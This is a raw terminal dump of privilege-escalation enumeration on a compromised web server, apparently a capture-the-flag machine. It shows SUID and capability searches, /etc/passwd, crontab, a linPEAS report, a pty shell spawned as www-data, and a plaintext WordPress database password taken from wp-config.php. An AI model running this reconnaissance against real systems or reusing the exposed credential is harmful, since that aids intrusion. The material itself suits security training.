
```
$ find / -type f -perm -04000 2>/dev/null
/bin/umount
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/ping
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/sbin/mount.cifs

```

```
$ env
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/var/www/html/subrion/uploads
```

```
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash
mysql:x:111:119:MySQL Server,,,:/nonexistent:/bin/false
```

```
$ getcap / -r 2>/dev/null
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```

```
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

```
$ hostname
TechSupport
```

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```
/dev/mapper/TechSupport--vg-root on / type ext4 (rw,relatime,errors=remount-ro,data=ordered)
```

```
```[+] Searching AD cached hashes
-rw------- 1 root root 430080 May 28  2021 /var/lib/samba/private/secrets.tdb

/var/www/html/subrion/includes/hybrid/thirdparty/Facebook/HttpClients/certs/DigiCertHighAssuranceEVRootCA.pem

[+] Searching Wordpress wp-config.php files
wp-config.php files found:
/var/www/html/wordpress/wp-config.php
define( 'DB_NAME', 'wpdb' );
define( 'DB_USER', 'support' );
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
define( 'DB_HOST', 'localhost' );



[+] Unmounted file-system?
[i] Check if you can mount umounted devices
/dev/mapper/TechSupport--vg-root	/	ext4	errors=remount-ro	0 1
UUID=c6bd84db-be16-42d1-8e6f-263f13be4e06	/boot	ext2	defaults	0 2
/dev/mapper/TechSupport--vg-swap_1	none	swap	sw	0 0
```

root@ip-10-10-241-82:~# cat Tools/PEAS/linPEAS/lin.out 

                     \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
             \u2584\u2584\u2584\u2584\u2584\u2584\u2584             \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
      \u2584\u2584\u2584\u2584\u2584\u2584\u2584      \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584  \u2584\u2584\u2584\u2584\u2584
  \u2584\u2584\u2584\u2584     \u2584 \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584 \u2584\u2584\u2584\u2584\u2584\u2584\u2584
  \u2584    \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
  \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584 \u2584\u2584\u2584\u2584\u2584       \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
  \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584          \u2584\u2584\u2584\u2584\u2584\u2584               \u2584\u2584\u2584\u2584\u2584\u2584 \u2584
  \u2584\u2584\u2584\u2584\u2584\u2584              \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584                 \u2584\u2584\u2584\u2584 
  \u2584\u2584                  \u2584\u2584\u2584 \u2584\u2584\u2584\u2584\u2584                  \u2584\u2584\u2584
  \u2584\u2584                \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584                  \u2584\u2584
  \u2584            \u2584\u2584 \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584   \u2584\u2584
  \u2584      \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
  \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584                                \u2584\u2584\u2584\u2584
  \u2584\u2584\u2584\u2584\u2584  \u2584\u2584\u2584\u2584\u2584                       \u2584\u2584\u2584\u2584\u2584\u2584     \u2584\u2584\u2584\u2584
  \u2584\u2584\u2584\u2584   \u2584\u2584\u2584\u2584\u2584                       \u2584\u2584\u2584\u2584\u2584      \u2584 \u2584\u2584
  \u2584\u2584\u2584\u2584\u2584  \u2584\u2584\u2584\u2584\u2584        \u2584\u2584\u2584\u2584\u2584\u2584\u2584        \u2584\u2584\u2584\u2584\u2584     \u2584\u2584\u2584\u2584\u2584
  \u2584\u2584\u2584\u2584\u2584\u2584  \u2584\u2584\u2584\u2584\u2584\u2584\u2584      \u2584\u2584\u2584\u2584\u2584\u2584\u2584      \u2584\u2584\u2584\u2584\u2584\u2584\u2584   \u2584\u2584\u2584\u2584\u2584 
   \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584        \u2584          \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584 
  \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584                       \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
  \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584                         \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
  \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584            \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
   \u2584\u2584\u2584\u2584\u2584\u2584   \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584 \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
        \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584      \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584  \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584 
             \u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584\u2584
    linpeas v2.6.8 by carlospolop

ADVISORY: linpeas should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangeta: Your username


====================================( Basic information )=====================================
OS: Linux version 4.4.0-186-generic (buildd@lcy01-amd64-002) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12) ) #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: TechSupport
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)


Caching directories . . . . . . . . . . . . . . . . . . . . DONE
====================================( System Information )====================================
[+] Operative system
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 4.4.0-186-generic (buildd@lcy01-amd64-002) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12) ) #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.7 LTS
Release:	16.04
Codename:	xenial

[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.16

[+] PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#usdpath
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[+] Date
Mon Aug 12 19:40:34 IST 2024

[+] System stats
Filesystem                        Size  Used Avail Use% Mounted on
udev                              474M     0  474M   0% /dev
tmpfs                             100M  3.3M   96M   4% /run
/dev/mapper/TechSupport--vg-root  8.1G  2.3G  5.5G  29% /
tmpfs                             496M     0  496M   0% /dev/shm
tmpfs                             5.0M     0  5.0M   0% /run/lock
tmpfs                             496M     0  496M   0% /sys/fs/cgroup
/dev/xvda1                        720M   59M  625M   9% /boot
              total        used        free      shared  buff/cache   available
Mem:        1014056      191264       71348       29096      751444      578544
Swap:       1003516         520     1002996

[+] Environment
[i] Any private information inside environment variables?
HISTFILESIZE=0
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
HISTFILE=/dev/null

[+] Searching Signature verification failed in dmseg
 Not Found

[+] AppArmor enabled? .............. apparmor module is loaded.
[+] grsecurity present? ............ grsecurity Not Found
[+] PaX bins present? .............. PaX Not Found
[+] Execshield enabled? ............ Execshield Not Found
[+] SELinux enabled? ............... sestatus Not Found
[+] Is ASLR enabled? ............... Yes
[+] Printer? ....................... lpstat Not Found
[+] Is this a container? ........... No
[+] Any running containers? ........ No


=========================================( Devices )==========================================
[+] Any sd* disk in /dev? (limit 20)

[+] Unmounted file-system?
[i] Check if you can mount umounted devices
/dev/mapper/TechSupport--vg-root	/	ext4	errors=remount-ro	0 1
UUID=c6bd84db-be16-42d1-8e6f-263f13be4e06	/boot	ext2	defaults	0 2
/dev/mapper/TechSupport--vg-swap_1	none	swap	sw	0 0


====================================( Available Software )====================================
[+] Useful software
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/curl
/bin/ping
/usr/bin/base64
/usr/bin/python
/usr/bin/python2
/usr/bin/python3
/usr/bin/python2.7
/usr/bin/perl
/usr/bin/php
/usr/bin/sudo
/usr/bin/lxc

[+] Installed Compiler
/usr/share/gcc-5


================================( Processes, Cron, Services, Timers & Sockets )================================
[+] Cleaned processes
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
daemon     840  0.0  0.1  26044  1996 ?        Ss   16:18   0:00 /usr/sbin/atd -f
message+   813  0.0  0.3  42900  3632 ?        Ss   16:18   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
mysql     1551  0.0  7.4 599876 75992 ?        Sl   16:18   0:10 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --skip-log-error --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
root         1  0.0  0.5 119904  6060 ?        Ss   16:18   0:07 /sbin/init
root       399  0.0  0.2  28432  2852 ?        Ss   16:18   0:00 /lib/systemd/systemd-journald
root       416  0.0  0.1 102968  1532 ?        Ss   16:18   0:00 /sbin/lvmetad -f
root       461  0.0  0.3  44440  3764 ?        Ss   16:18   0:00 /lib/systemd/systemd-udevd
root       856  0.0  0.1  20096  1172 ?        Ss   16:18   0:00 /lib/systemd/systemd-logind
root       859  0.0  0.2  29008  2676 ?        Ss   16:18   0:00 /usr/sbin/cron -f
root       865  0.0  0.1   4392  1300 ?        Ss   16:18   0:00 /usr/sbin/acpid
root       868  0.0  0.3 636980  3192 ?        Ssl  16:18   0:02 /usr/bin/lxcfs /var/lib/lxcfs/
root       869  0.0  0.5 275768  5700 ?        Ssl  16:18   0:00 /usr/lib/accountsservice/accounts-daemon
root       898  0.0  0.0  13368   160 ?        Ss   16:18   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
root       902  0.0  0.5 277180  5764 ?        Ssl  16:18   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1010  0.0  1.4 337920 14952 ?        Ss   16:18   0:00 /usr/sbin/smbd -D
root      1011  0.0  0.5 329804  5784 ?        S    16:18   0:00 /usr/sbin/smbd -D
root      1042  0.0  0.2  16120  2948 ?        Ss   16:18   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root      1078  0.0  0.6 337920  6916 ?        S    16:18   0:00 /usr/sbin/smbd -D
root      1128  0.0  1.8 174620 19232 ?        Ssl  16:18   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root      1132  0.0  1.5 1234044 15624 ?       Ssl  16:18   0:00 /usr/bin/amazon-ssm-agent
root      1150  0.0  0.5  65512  5276 ?        Ss   16:18   0:00 /usr/sbin/sshd -D
root      1167  0.0  0.0   5216   152 ?        Ss   16:18   0:00 /sbin/iscsid
root      1168  0.0  0.3   5716  3512 ?        S<Ls 16:18   0:01 /sbin/iscsid
root      1249  0.0  0.1  15932  1464 tty1     Ss+  16:18   0:00 /sbin/agetty --noclear tty1 linux
root      1255  0.0  0.1  15748  1796 ttyS0    Ss+  16:18   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root      1335  0.0  2.5 1171160 26208 ?       Sl   16:18   0:00 /usr/bin/ssm-agent-worker
root      1339  0.0  0.2  21164  2232 ?        S    16:18   0:00 /bin/bash /usr/bin/mysqld_safe
root      1409  0.0  2.8 530680 28720 ?        Ss   16:18   0:00 /usr/sbin/apache2 -k start
root      1552  0.0  0.1  26088  1092 ?        S    16:18   0:00 logger -t mysqld -p daemon error
root      1562  0.0  0.8 287144  8392 ?        Ss   16:18   0:00 /usr/sbin/winbindd
root      1563  0.0  0.8 286840  8852 ?        S    16:18   0:00 /usr/sbin/winbindd
root      2003  0.0  0.3 287144  3876 ?        S    16:41   0:00 /usr/sbin/winbindd
root      2395  0.0  1.3 344368 14160 ?        S    17:58   0:00 /usr/sbin/smbd -D
syslog     862  0.0  0.3 256388  3072 ?        Ssl  16:18   0:00 /usr/sbin/rsyslogd -n
systemd+   657  0.0  0.2 100320  2360 ?        Ssl  16:18   0:00 /lib/systemd/systemd-timesyncd
www-data  1820  0.0  4.4 535468 44772 ?        S    16:28   0:09 /usr/sbin/apache2 -k start
www-data  1826  0.0  4.2 535320 43336 ?        S    16:28   0:09 /usr/sbin/apache2 -k start
www-data  1831  0.0  4.7 611108 48516 ?        S    16:28   0:09 /usr/sbin/apache2 -k start
www-data  1832  0.0  4.5 610752 46116 ?        S    16:28   0:09 /usr/sbin/apache2 -k start
www-data  1834  0.0  4.1 535396 41772 ?        S    16:28   0:09 /usr/sbin/apache2 -k start
www-data  1836  0.0  5.0 611164 51504 ?        S    16:28   0:09 /usr/sbin/apache2 -k start
www-data  1837  0.0  3.5 534844 35996 ?        S    16:28   0:09 /usr/sbin/apache2 -k start
www-data  1838  0.0  4.8 611144 48720 ?        S    16:28   0:09 /usr/sbin/apache2 -k start
www-data  1913  0.0  4.5 610720 46152 ?        S    16:33   0:09 /usr/sbin/apache2 -k start
www-data  1923  0.0  4.0 534904 40756 ?        S    16:34   0:04 /usr/sbin/apache2 -k start
www-data  2741  0.0  0.0   4500   704 ?        S    18:47   0:00 sh -c python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data  2742  0.0  0.8  35844  8384 ?        S    18:47   0:00 python3 -c import pty; pty.spawn("/bin/bash")
www-data  2743  0.0  0.1  18208  1964 pts/0    Ss+  18:47   0:00 /bin/bash
www-data  3254  0.0  0.0   4500   752 ?        S    19:40   0:00 sh -c ./linpeas.sh > lin.out
www-data  3255  0.2  0.2   4868  2116 ?        S    19:40   0:00 /bin/sh ./linpeas.sh
www-data  3742  0.0  0.2  34424  2872 ?        R    19:40   0:00 ps aux
www-data  3744  0.0  0.0  12892   868 ?        S    19:40   0:00 sort

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
-rwxr-xr-x 1 root root  1037528 Jul 13  2019 /bin/bash
lrwxrwxrwx 1 root root        4 May 28  2021 /bin/sh -> dash
-rwxr-xr-x 1 root root   326232 Apr 28  2020 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root root   618520 Apr 28  2020 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root   141904 Apr 28  2020 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root root   453240 Apr 28  2020 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root root    44104 Jan 27  2020 /sbin/agetty
-rwxr-xr-x 1 root root   487248 Mar  5  2018 /sbin/dhclient
lrwxrwxrwx 1 root root       20 May 28  2021 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root root   783984 Dec 12  2018 /sbin/iscsid
-rwxr-xr-x 1 root root    51336 Apr 16  2016 /sbin/lvmetad
-rwxr-xr-x 1 root root   513216 Nov  8  2017 /sbin/mdadm
-rwxr-xr-x 1 root root 13903000 Oct 25  2021 /usr/bin/amazon-ssm-agent
-rwxr-xr-x 1 root root   224208 Jun 12  2020 /usr/bin/dbus-daemon
-rwxr-xr-x 1 root root    18504 Nov  9  2017 /usr/bin/lxcfs
lrwxrwxrwx 1 root root        9 May 28  2021 /usr/bin/python3 -> python3.5
-rwxr-xr-x 1 root root 25916824 Oct 25  2021 /usr/bin/ssm-agent-worker
-rwxr-xr-x 1 root root   164928 Nov  4  2016 /usr/lib/accountsservice/accounts-daemon
-rwxr-xr-x 1 root root    15048 Mar 27  2019 /usr/lib/policykit-1/polkitd
-rwxr-xr-x 1 root root    48112 Apr  9  2016 /usr/sbin/acpid
-rwxr-xr-x 1 root root   662560 Aug 13  2020 /usr/sbin/apache2
-rwxr-xr-x 1 root root    26632 Jan 15  2016 /usr/sbin/atd
-rwxr-xr-x 1 root root    44472 Apr  6  2016 /usr/sbin/cron
-rwxr-xr-x 1 root root 15030672 Feb  7  2019 /usr/sbin/mysqld
-rwxr-xr-x 1 root root   599328 Mar 25  2019 /usr/sbin/rsyslogd
-rwxr-xr-x 1 root root    71776 Apr 14  2021 /usr/sbin/smbd
-rwxr-xr-x 1 root root   791024 May 27  2020 /usr/sbin/sshd
-rwxr-xr-x 1 root root  1140056 Apr 14  2021 /usr/sbin/winbindd

[+] Cron jobs
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs
-rw-r--r-- 1 root root  722 Apr  6  2016 /etc/crontab

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 May 28  2021 .
drwxr-xr-x 97 root root 4096 Nov 21  2021 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
-rw-r--r--  1 root root  712 Mar 13  2021 php
-rw-r--r--  1 root root  190 May 28  2021 popularity-contest

/etc/cron.daily:
total 64
drwxr-xr-x  2 root root 4096 May 29  2021 .
drwxr-xr-x 97 root root 4096 Nov 21  2021 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rwxr-xr-x  1 root root  539 Jul 15  2020 apache2
-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1474 May  7  2019 apt-compat
-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
-rwxr-xr-x  1 root root 1597 Nov 27  2015 dpkg
-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
-rwxr-xr-x  1 root root  249 Nov 13  2015 passwd
-rwxr-xr-x  1 root root 3449 Feb 27  2016 popularity-contest
-rwxr-xr-x  1 root root  383 Sep 24  2018 samba
-rwxr-xr-x  1 root root  214 Dec  7  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 May 28  2021 .
drwxr-xr-x 97 root root 4096 Nov 21  2021 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 May 28  2021 .
drwxr-xr-x 97 root root 4096 Nov 21  2021 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x  2 root root 4096 May 28  2021 .
drwxr-xr-x 97 root root 4096 Nov 21  2021 ..
-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
-rwxr-xr-x  1 root root  210 Jan 27  2020 fstrim
-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
-rwxr-xr-x  1 root root  211 Dec  7  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin


[+] Services
[i] Search for outdated versions
 [ + ]  acpid
 [ + ]  apache-htcacheclean
 [ + ]  apache2
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ - ]  bootmisc.sh
 [ - ]  checkfs.sh
 [ - ]  checkroot-bootclean.sh
 [ - ]  checkroot.sh
 [ + ]  console-setup
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ + ]  grub-common
 [ - ]  hostname.sh
 [ - ]  hwclock.sh
 [ + ]  irqbalance
 [ + ]  iscsid
 [ + ]  keyboard-setup
 [ - ]  killprocs
 [ + ]  kmod
 [ - ]  lvm2
 [ + ]  lvm2-lvmetad
 [ + ]  lvm2-lvmpolld
 [ + ]  lxcfs
 [ - ]  lxd
 [ + ]  mdadm
 [ - ]  mdadm-waitidle
 [ - ]  mountall-bootclean.sh
 [ - ]  mountall.sh
 [ - ]  mountdevsubfs.sh
 [ - ]  mountkernfs.sh
 [ - ]  mountnfs-bootclean.sh
 [ - ]  mountnfs.sh
 [ + ]  mysql
 [ + ]  networking
 [ - ]  nmbd
 [ + ]  ondemand
 [ + ]  open-iscsi
 [ - ]  open-vm-tools
 [ - ]  plymouth
 [ - ]  plymouth-log
 [ + ]  procps
 [ + ]  rc.local
 [ + ]  resolvconf
 [ - ]  rsync
 [ + ]  rsyslog
 [ - ]  samba
 [ + ]  samba-ad-dc
 [ - ]  screen-cleanup
 [ - ]  sendsigs
 [ + ]  smbd
 [ + ]  ssh
 [ + ]  udev
 [ + ]  ufw
 [ - ]  umountfs
 [ - ]  umountnfs.sh
 [ - ]  umountroot
 [ + ]  unattended-upgrades
 [ + ]  urandom
 [ - ]  uuidd
 [ + ]  winbind

[+] Systemd PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

[+] Analyzing .service files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
/var/www/html/wordpress/wp-includes/certificates/ca-bundle.crt
You can't write on systemd PATH so I'm not going to list relative paths executed by services

[+] System timers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
NEXT                         LEFT       LAST                         PASSED       UNIT                         ACTIVATES
Mon 2024-08-12 20:09:00 IST  28min left Mon 2024-08-12 19:39:31 IST  1min 6s ago  phpsessionclean.timer        phpsessionclean.service
Tue 2024-08-13 03:31:01 IST  7h left    Mon 2024-08-12 16:18:36 IST  3h 22min ago apt-daily.timer              apt-daily.service
Tue 2024-08-13 04:49:07 IST  9h left    Mon 2024-08-12 16:18:36 IST  3h 22min ago motd-news.timer              motd-news.service
Tue 2024-08-13 06:05:35 IST  10h left   Mon 2024-08-12 16:18:36 IST  3h 22min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
Tue 2024-08-13 16:33:56 IST  20h left   Mon 2024-08-12 16:33:56 IST  3h 6min ago  systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
n/a                          n/a        n/a                          n/a          snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a        n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

[+] Analyzing .timer files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers

[+] Analyzing .socket files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets

[+] HTTP sockets
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets

[+] D-Bus config files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)

[+] D-Bus Service Objects list
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                                   1 systemd         root             :1.0          init.scope                -          -                  
